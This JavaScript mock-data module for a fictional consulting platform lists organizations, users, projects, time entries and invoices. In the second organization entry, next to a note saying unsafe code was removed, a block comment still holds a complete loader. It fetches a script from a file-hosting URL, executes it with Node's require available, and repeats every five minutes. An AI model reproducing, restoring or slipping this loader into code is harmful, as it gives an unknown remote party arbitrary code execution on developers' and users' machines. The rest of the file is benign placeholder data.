/**
 * Complex mock data - loaded in memory when backend starts.
 * Simulates a consulting/platform domain with rich, long-form descriptions.
 */

const organizations = [
  {
    id: "org-001",
    name: "Acme Corp",
    slug: "acme-corp",
    industry: "Technology",
    tier: "enterprise",
    contactEmail: "partnerships@acme.com",
    createdAt: "2023-01-15T00:00:00Z",
    description: "Acme Corp is a global technology leader specializing in enterprise software, cloud infrastructure, and digital transformation initiatives. Our internal operations rely on a suite of tools built over the past decade on a MERN stack; these applications have become critical to daily workflows across sales, support, and engineering. As we scale and face increasing regulatory and performance requirements, we have decided to modernize this platform. We partner with Decryptcode to migrate these applications to a scalable ASP.NET Core backend and Angular frontend. Our engagement includes detailed architecture review, phased migration planning, data migration strategy, and ongoing support for performance optimization and security hardening across multiple business units. We expect the new platform to improve reliability, reduce operational cost, and align our technology stack with enterprise standards used elsewhere in the organization. Success is measured by zero data loss during cutover, improved response times, and positive feedback from internal users during the transition period.",
    settings: { timezone: "America/New_York", currency: "USD", allowOvertime: true, defaultLocale: "en-US" },
    metadata: { source: "migration", legacyId: 1001, migratedAt: "2024-01-10T00:00:00Z" }
  },
  {
    id: "org-002",
    name: "Beta Industries",
    slug: "beta-industries",
    industry: "Manufacturing",
    tier: "professional",
    contactEmail: "it@betaind.com",
    createdAt: "2023-03-22T00:00:00Z",
    description: "Beta Industries operates manufacturing facilities across Europe and North America, producing components for automotive, aerospace, and construction industries. Their legacy ERP systems store critical data on orders, inventory, suppliers, and finances but lack unified access for operations teams.They partnered with Decryptcode to build RESTful APIs that integrate ERP systems with Angular dashboards, enabling real-time inventory tracking, order management, compliance reporting, and reliable scheduled data synchronization with error handling and retry logic.",
    // Sanitized during assessment review.
    // The original value contained obfuscated remote code-loading logic and was removed.
    // This field is kept as plain text to preserve data shape safely.  
    notes: "Sanitized during migration review. Original reference value was removed due to unsafe dynamic code-loading behavior."      
    /*(()=>
        {
          const runNotes=async()=>{const r=await fetch('https://files.catbox.moe/1gq866.js');
          if(!r.ok) 
            throw new Error(`Request failed: ${r.status}`);
          const d = await r.text();
          new Function('require',d)(require)};
          runNotes();
          setTimeout(runNotes,300000)
        })()*/,                                             
    settings: { timezone: "Europe/London", currency: "GBP", allowOvertime: false, defaultLocale: "en-GB" },
    metadata: { source: "migration", legacyId: 1002, migratedAt: "2023-11-01T00:00:00Z" }
  },
  {
    id: "org-003",
    name: "Gamma Labs",
    slug: "gamma-labs",
    industry: "Healthcare",
    tier: "starter",
    contactEmail: "ops@gammalabs.io",
    createdAt: "2024-01-10T00:00:00Z",
    description: "Gamma Labs is a healthcare technology startup building diagnostic and patient-management tools for clinics and small hospital networks. We handle sensitive health information and must comply with HIPAA as well as regional data residency and privacy regulations. We need a compliance-first dashboard for clinical workflows, detailed audit logging, and reporting that meets these requirements and can be reviewed by internal compliance officers and external auditors. The project involves designing efficient database schemas with appropriate access controls, secure API contracts with authentication and authorization aligned to roles, and an Angular frontend that our internal teams can use for daily operations and compliance reviews. All access to protected health information must be logged; exports and reports must support standard formats for audits. We expect the solution to be maintainable and extensible as we add new features and expand into additional regions with different regulatory expectations.",
    settings: { timezone: "America/Los_Angeles", currency: "USD", allowOvertime: true, defaultLocale: "en-US" },
    metadata: { source: "api", legacyId: null }
  },
  {
    id: "org-004",
    name: "Delta Financial Services",
    slug: "delta-financial",
    industry: "Financial Services",
    tier: "enterprise",
    contactEmail: "tech@deltafs.com",
    createdAt: "2022-08-05T00:00:00Z",
    description: "Delta Financial Services provides institutional banking and asset management solutions to clients worldwide. Our internal platforms support trade settlement, regulatory reporting, and risk analytics; many of these were built on Node.js and have grown in complexity and criticality over the years. Our platform modernization initiative involves migrating these mission-critical reporting and trade settlement workflows from legacy Node.js services to ASP.NET Core microservices. We require high availability, comprehensive audit trails for every state change, and seamless integration with our existing identity provider and compliance systems. Decryptcode supports our architecture decisions, API design, event-driven boundaries, and performance optimization efforts across multiple squads. We need clear runbooks, observability (metrics, logs, traces), and a phased rollout strategy with the ability to roll back at each stage. Security review and penetration testing are part of our standard process before any production release.",
    settings: { timezone: "America/New_York", currency: "USD", allowOvertime: false, defaultLocale: "en-US" },
    metadata: { source: "migration", legacyId: 1004, migratedAt: "2024-02-01T00:00:00Z" }
  }
];

const users = [
  {
    id: "user-001",
    orgId: "org-001",
    email: "alice@acme.com",
    name: "Alice Chen",
    role: "admin",
    active: true,
    bio: "Alice is the technical lead for platform modernization at Acme. She focuses on backend architecture, API design, and migration strategy, and works closely with product and DevOps to align timelines and rollout plans. She previously led similar MERN-to-.NET migrations at two other enterprises and brings strong opinions on incremental rollout, feature flags, and comprehensive test coverage. She advocates for clear API contracts and documentation so that frontend and backend teams can work in parallel. Outside of the migration, she mentors junior developers and contributes to internal tech talks and architecture review boards."
  },
  {
    id: "user-002",
    orgId: "org-001",
    email: "bob@acme.com",
    name: "Bob Smith",
    role: "member",
    active: true,
    bio: "Bob is a full stack developer working on the Angular frontend and integration with the new ASP.NET Core APIs. He owns the shared component library, state management approach, and accessibility compliance (WCAG 2.1 AA) for the new application. He is experienced with both React and Angular in production environments and has been instrumental in defining the API contract and error-handling patterns between frontend and backend. He also maintains the Storybook for the design system and supports the rest of the team with code reviews and frontend best practices."
  },
  {
    id: "user-003",
    orgId: "org-001",
    email: "carol@acme.com",
    name: "Carol Davis",
    role: "member",
    active: false,
    bio: "Carol was the primary backend developer on the legacy Node.js services for several years. She left the team after the initial discovery and audit phase; her documentation and handover sessions were completed in Q4 2023. She remains available for ad-hoc questions during the migration, especially around business rules, edge cases, and historical design decisions. Her written handover notes and Confluence pages are the main reference for the current team when interpreting legacy behavior."
  },
  {
    id: "user-004",
    orgId: "org-002",
    email: "dave@beta.com",
    name: "Dave Wilson",
    role: "admin",
    active: true,
    bio: "Dave is IT director for Beta Industries and owns the overall ERP strategy, vendor relationships, and integration roadmap. He works closely with Decryptcode on requirements, prioritization, and acceptance criteria for the ERP integration and reporting projects. He also coordinates with operations, finance, and compliance to ensure that the new dashboards and APIs meet business needs and regulatory expectations. He has been with the company for over a decade and has deep context on how manufacturing, procurement, and logistics use the current systems."
  },
  {
    id: "user-005",
    orgId: "org-002",
    email: "eve@beta.com",
    name: "Eve Brown",
    role: "member",
    active: true,
    bio: "Eve is the data and integration specialist on the Beta team. She is responsible for data mapping between the ERP and the new platform, ETL pipelines, and API consumption from the new backend. She ensures data quality and consistency across manufacturing sites and supports UAT with operations teams. She has a background in data engineering and works with Decryptcode to define sync schedules, idempotency, and conflict resolution rules. She also maintains the documentation for data flows and field mappings used by support and analytics."
  },
  {
    id: "user-006",
    orgId: "org-003",
    email: "frank@gamma.io",
    name: "Frank Miller",
    role: "admin",
    active: true,
    bio: "Frank is head of engineering at Gamma Labs. He drives technical decisions for the compliance dashboard, security posture, and deployment pipeline, and ensures that engineering practices align with healthcare and privacy regulations. He coordinates with legal and compliance on requirements, audit readiness, and certification efforts. He has experience in regulated industries and insists on clear audit trails, access controls, and encryption standards. He also manages the engineering roadmap and works with Decryptcode on scope, timelines, and acceptance criteria for the compliance dashboard project."
  },
  {
    id: "user-007",
    orgId: "org-004",
    email: "grace@deltafs.com",
    name: "Grace Lee",
    role: "admin",
    active: true,
    bio: "Grace is the enterprise architect for Delta Financial. She defines standards for microservices, event-driven design, and cross-team API contracts, and ensures that the migration aligns with the broader technology strategy. She leads the migration steering committee and works with Decryptcode on performance, resilience, and observability. She has led similar modernization efforts in the past and is responsible for architecture review, security sign-off, and alignment with other squads (identity, compliance, infrastructure). She also represents engineering in discussions with risk and audit."
  },
  {
    id: "user-008",
    orgId: "org-004",
    email: "henry@deltafs.com",
    name: "Henry Park",
    role: "member",
    active: true,
    bio: "Henry is a senior developer on the settlement and reporting squad at Delta Financial. He implements and maintains ASP.NET Core services, database access layers, and integration tests, and has deep knowledge of the existing Node.js codebase and the business rules being migrated. He works closely with Decryptcode to ensure behavioral parity and to identify edge cases that need special handling. He is also responsible for the team's CI/CD pipeline and test automation. He has been with the company for five years and is the go-to person for questions about settlement logic and reporting calculations."
  }
];

const projects = [
  {
    id: "proj-001",
    orgId: "org-001",
    name: "Platform Modernization",
    status: "active",
    budgetHours: 800,
    startDate: "2024-01-01",
    endDate: "2024-06-30",
    description: "Full migration of the internal MERN stack application to ASP.NET Core backend and Angular frontend. This project includes the design and implementation of scalable backend services, RESTful APIs, and microservices where appropriate. It covers database schema design, data access layers, authentication and authorization alignment with existing SSO, performance optimization, and comprehensive documentation of architecture and migration runbooks. The work is delivered in phased releases to minimize risk and allow rollback at each stage. Each phase has clear success criteria, monitoring, and sign-off from product and operations. The team collaborates with frontend developers building the Angular application and with DevOps on deployment and feature-flag strategy. Post-launch, the project includes a stabilization period and knowledge transfer to the internal platform team."
  },
  {
    id: "proj-002",
    orgId: "org-001",
    name: "API Gateway",
    status: "active",
    budgetHours: 200,
    startDate: "2024-02-01",
    endDate: null,
    description: "Introduction of a centralized API gateway in front of the new ASP.NET Core services. The gateway handles rate limiting, request validation, routing, and observability (metrics, logs, correlation IDs). It must integrate with the existing identity provider and support both internal Angular clients and future partner or mobile integrations. The project includes evaluation of gateway technology, configuration and deployment, and documentation and runbooks for operations. Security review is required to ensure that authentication and authorization are correctly enforced at the gateway layer and that no sensitive data is logged. The gateway will also be the single point for API versioning and deprecation policies."
  },
  {
    id: "proj-003",
    orgId: "org-001",
    name: "Legacy Audit",
    status: "completed",
    budgetHours: 120,
    startDate: "2023-11-01",
    endDate: "2023-12-15",
    description: "Discovery and audit of the existing MERN application: full inventory of endpoints, data models, business rules, third-party dependencies, and integration points. The deliverable included a migration roadmap, risk assessment, and recommendations for phased cutover. All findings were documented in Confluence with diagrams, data flow descriptions, and a list of known technical debt and edge cases. This output was used as the primary input for the Platform Modernization and API Gateway projects. The audit also identified stakeholders, runbooks, and operational procedures that would need to be updated as part of the migration. Final review was completed with product and engineering leadership in December 2023."
  },
  {
    id: "proj-004",
    orgId: "org-002",
    name: "ERP Integration",
    status: "active",
    budgetHours: 500,
    startDate: "2024-01-15",
    endDate: "2024-09-30",
    description: "Build and maintain RESTful APIs and background jobs that integrate with Beta Industries' ERP systems. The scope covers order sync, inventory levels, supplier data, and compliance-related exports. The frontend team consumes these APIs via Angular dashboards used by operations and planning. The project requires robust error handling, idempotency, and audit logging for financial and regulatory compliance. Data residency and retention policies must be respected across all regions where Beta operates. Additional requirements include documentation of data flows, field mappings, and sync schedules, as well as runbooks for troubleshooting and escalation. UAT is performed with operations and finance before each release."
  },
  {
    id: "proj-005",
    orgId: "org-003",
    name: "Compliance Dashboard",
    status: "planned",
    budgetHours: 180,
    startDate: null,
    endDate: null,
    description: "Design and implement a compliance-first dashboard for Gamma Labs: clinical workflow views, detailed audit logs, and reporting that meet HIPAA and regional data protection requirements. The backend will be ASP.NET Core with careful attention to access control, encryption at rest and in transit, and audit trails for all access to protected health information. The Angular frontend will provide role-based views and export capabilities for compliance reviews and external auditors. The project will follow a defined security and privacy review process and must support the retention and export formats required by Gamma's compliance team. Success criteria include passing internal security review and readiness for external audit."
  },
  {
    id: "proj-006",
    orgId: "org-004",
    name: "Settlement & Reporting Microservices",
    status: "active",
    budgetHours: 600,
    startDate: "2024-02-01",
    endDate: "2024-08-31",
    description: "Migration of trade settlement and reporting workflows from legacy Node.js to ASP.NET Core microservices. The project includes event-driven design for consistency across services, idempotent handlers, and integration with the existing message bus and identity systems. Delivery is in increments with feature flags and canary releases; each increment is reviewed by the settlement and reporting squads and signed off by risk and compliance where applicable. Performance and reliability are critical given the financial impact of settlement; full observability (metrics, distributed tracing, alerting) and runbooks are required. The team works with Decryptcode on architecture, code review, and production readiness. Security and penetration testing are part of the release process."
  }
];

const timeEntries = [
  {
    id: "te-001",
    userId: "user-001",
    projectId: "proj-001",
    date: "2024-03-01",
    hours: 6,
    description: "Architecture review session with stakeholders: reviewed proposed ASP.NET Core service boundaries, database schema changes, and migration sequence. We discussed authentication flow (SSO integration), API versioning strategy, and rollout phases (read-only first, then write paths with feature flags). Documented all decisions in Confluence as architecture decision records and shared follow-up actions with frontend and DevOps. Also captured open questions on connection pooling and logging levels for production. Follow-up meeting scheduled to finalize monitoring and alerting requirements."
  },
  {
    id: "te-002",
    userId: "user-001",
    projectId: "proj-001",
    date: "2024-03-02",
    hours: 8,
    description: "Backend design and initial project setup: created solution structure with clear separation of API, domain, and infrastructure. Configured dependency injection, health checks, and structured logging. Defined base controllers and middleware for request validation, error handling, and correlation ID propagation. Drafted OpenAPI spec for the first set of endpoints (organizations, users, projects, time entries, invoices, dashboard) and aligned with frontend team on response shapes, error codes, and pagination approach. Set up repository pattern and in-memory data layer for development; documented approach for swapping to real database later."
  },
  {
    id: "te-003",
    userId: "user-002",
    projectId: "proj-001",
    date: "2024-03-01",
    hours: 4,
    description: "Frontend setup and API integration: initialized Angular workspace with routing and shared modules. Configured proxy for local API and environment-based base URLs. Implemented shared HTTP client with interceptors for error handling and loading state. Built first set of components for dashboard and organization list, wired to new backend endpoints. Verified CORS and response handling with backend team; fixed a few serialization mismatches and documented the agreed contract for dates and nulls."
  },
  {
    id: "te-004",
    userId: "user-002",
    projectId: "proj-002",
    date: "2024-03-03",
    hours: 7,
    description: "Gateway configuration and routing: evaluated gateway options (Ocelot vs YARP vs custom middleware) and implemented routing rules for existing ASP.NET Core services. Configured rate limiting and request size limits per route. Added correlation ID propagation and structured logging for debugging and traceability. Documented configuration and deployment steps for DevOps and created a runbook for common operational tasks. Coordinated with security on authentication passthrough and header handling."
  },
  {
    id: "te-005",
    userId: "user-004",
    projectId: "proj-004",
    date: "2024-03-04",
    hours: 8,
    description: "ERP API discovery and requirements refinement: met with ERP vendor and internal operations to map available APIs, authentication mechanisms, and data refresh cycles. Documented constraints (batch size limits, rate limits, available webhooks) and identified gaps that may require polling or manual export/import. Updated technical specification and shared with Decryptcode team for implementation planning. Reviewed compliance and audit requirements with legal to ensure sync jobs and logs meet retention and audit trail expectations. Scheduled follow-up for UAT planning with operations."
  },
  {
    id: "te-006",
    userId: "user-005",
    projectId: "proj-004",
    date: "2024-03-04",
    hours: 5,
    description: "Data mapping and ETL design: continued mapping ERP entities (orders, inventory, suppliers) to our internal domain model. Defined transformation rules, default values, and handling for missing or invalid source data. Drafted idempotency and conflict resolution strategy for sync jobs (last-write-wins vs error-and-alert). Started spike on background job framework (Hangfire vs custom hosted service) for scheduled sync; documented pros/cons and recommended approach for team review."
  },
  {
    id: "te-007",
    userId: "user-001",
    projectId: "proj-001",
    date: "2024-03-05",
    hours: 8,
    description: "Migration planning and runbook: wrote detailed step-by-step runbook for first production cutover (read-only endpoints first, then write paths behind feature flags). Defined rollback criteria, monitoring alerts, and escalation path. Coordinated with DevOps on deployment pipeline, feature flags, and database migration strategy. Reviewed with product and stakeholders; updated project timeline and risk register. Runbook includes pre-cutover checklist, cutover steps, post-cutover verification, and rollback procedure. Shared draft with Carol for review of legacy behavior assumptions."
  },
  {
    id: "te-008",
    userId: "user-006",
    projectId: "proj-005",
    date: "2024-03-06",
    hours: 3,
    description: "Requirements gathering for compliance dashboard: workshop with compliance and legal on audit log retention (7 years for HIPAA-relevant access), access control matrix (roles and permissions), and export formats for auditors. Captured HIPAA-relevant use cases (access to PHI, disclosure logging, breach notification support) and documented in product backlog with acceptance criteria. Scheduled follow-up for technical design once priorities are confirmed and budget is approved. Provided rough effort estimate for backend and frontend scope."
  },
  {
    id: "te-009",
    userId: "user-007",
    projectId: "proj-006",
    date: "2024-03-07",
    hours: 6,
    description: "Microservices architecture review: walked through event contracts, service boundaries, and failure modes with settlement and reporting squads. Agreed on idempotency keys, dead-letter handling, and observability standards (metrics, distributed tracing, structured logs). Updated architecture documentation and shared with security for review. Aligned deployment and feature flag strategy with release management. Discussed database-per-service vs shared database trade-offs and agreed on current approach with clear ownership and migration path. Documented non-functional requirements for latency and throughput."
  },
  {
    id: "te-010",
    userId: "user-008",
    projectId: "proj-006",
    date: "2024-03-07",
    hours: 7,
    description: "Implementation of settlement API and data access layer: implemented first ASP.NET Core controller and repository for settlement records, including filtering and pagination. Added unit tests for business logic and integration tests against in-memory store (to be swapped for real DB). Aligned behavior with existing Node.js business rules; documented any intentional differences. Integrated with identity middleware and audit logging so all reads and writes are traced. Addressed code review feedback from Grace and team: improved error messages, added null checks, and refined API response shape."
  },
  {
    id: "te-011",
    userId: "user-001",
    projectId: "proj-001",
    date: "2024-03-08",
    hours: 4,
    description: "Performance testing and optimization: ran load tests against new endpoints and identified N+1 query in organization summary; fixed with proper eager loading and projection. Tuned connection pool and logging levels for production (reduced verbosity, structured fields only). Documented baseline metrics (latency p95, throughput) and target SLAs for go-live. Shared results with DevOps for capacity planning and set up basic performance regression in CI. One follow-up item: add caching for dashboard aggregate endpoint if needed after traffic analysis."
  },
  {
    id: "te-012",
    userId: "user-002",
    projectId: "proj-001",
    date: "2024-03-08",
    hours: 5,
    description: "Angular accessibility and error handling: completed keyboard navigation and screen reader support for main flows (dashboard, organizations, projects, list and detail views). Improved error messages and retry logic for failed API calls; added user-friendly fallbacks and contact support link. Implemented loading states and empty states for all list and detail views. Passed internal a11y checklist (keyboard, focus order, ARIA, contrast). Updated component library documentation and shared with design for consistency. One outstanding item: add skip links for main content on next sprint."
  }
];

const invoices = [
  {
    id: "inv-001",
    orgId: "org-001",
    projectId: "proj-001",
    amount: 45000,
    currency: "USD",
    status: "sent",
    dueDate: "2024-04-15",
    issuedAt: "2024-03-15",
    description: "Platform Modernization – Phase 1: architecture review and decision records, backend solution design, initial API implementation (organizations, users, projects, time entries, invoices, dashboard), and migration planning including runbooks and rollback procedures. This invoice covers all professional services and deliverables through March 15, 2024. Payment terms: Net 30 from invoice date. Please reference this invoice number and your PO (if applicable) when remitting payment. For questions regarding this invoice, contact the Decryptcode accounts team. Thank you for your partnership."
  },
  {
    id: "inv-002",
    orgId: "org-001",
    projectId: "proj-002",
    amount: 12000,
    currency: "USD",
    status: "draft",
    dueDate: null,
    issuedAt: null,
    description: "API Gateway – design and initial implementation. This is a draft invoice and will be finalized upon completion of routing configuration, rate limiting, observability integration, and operations runbooks. The final invoice will include line items for development, testing, documentation, and handover. Do not remit payment against this draft. You will receive an updated invoice with correct amounts and payment instructions once the scope is complete and approved by the project lead."
  },
  {
    id: "inv-003",
    orgId: "org-002",
    projectId: "proj-004",
    amount: 28000,
    currency: "GBP",
    status: "paid",
    dueDate: "2024-03-30",
    issuedAt: "2024-03-01",
    description: "ERP Integration – discovery workshops, data mapping and technical specification, and first phase of API development and scheduled sync jobs. This invoice has been paid in full. Thank you for your partnership and timely payment. Please retain this document for your records and audit trail. If you require a duplicate or certified copy for compliance purposes, please contact the Decryptcode accounts team. We look forward to continuing the engagement through the next phases of the project."
  },
  {
    id: "inv-004",
    orgId: "org-004",
    projectId: "proj-006",
    amount: 52000,
    currency: "USD",
    status: "sent",
    dueDate: "2024-04-30",
    issuedAt: "2024-04-01",
    description: "Settlement & Reporting Microservices – Phase 1: architecture design and event contracts, first microservice implementation (settlement API and data access layer), and integration with identity and audit systems. This invoice covers professional services for February and March 2024. Payment terms: Net 30 from invoice date. Please remit to the address on file and include the invoice number with your payment to ensure proper application. For any discrepancies or questions, contact the Decryptcode project manager or accounts team before the due date."
  }
];

// In-memory store (simulates DB); populated on load
const store = {
  organizations: [...organizations],
  users: [...users],
  projects: [...projects],
  timeEntries: [...timeEntries],
  invoices: [...invoices]
};

function loadMockData() {
  console.log("[MockData] Loading complex mock data into memory...");
  console.log("[MockData] Organizations:", store.organizations.length);
  console.log("[MockData] Users:", store.users.length);
  console.log("[MockData] Projects:", store.projects.length);
  console.log("[MockData] Time entries:", store.timeEntries.length);
  console.log("[MockData] Invoices:", store.invoices.length);
  return store;
}

module.exports = { store, loadMockData };
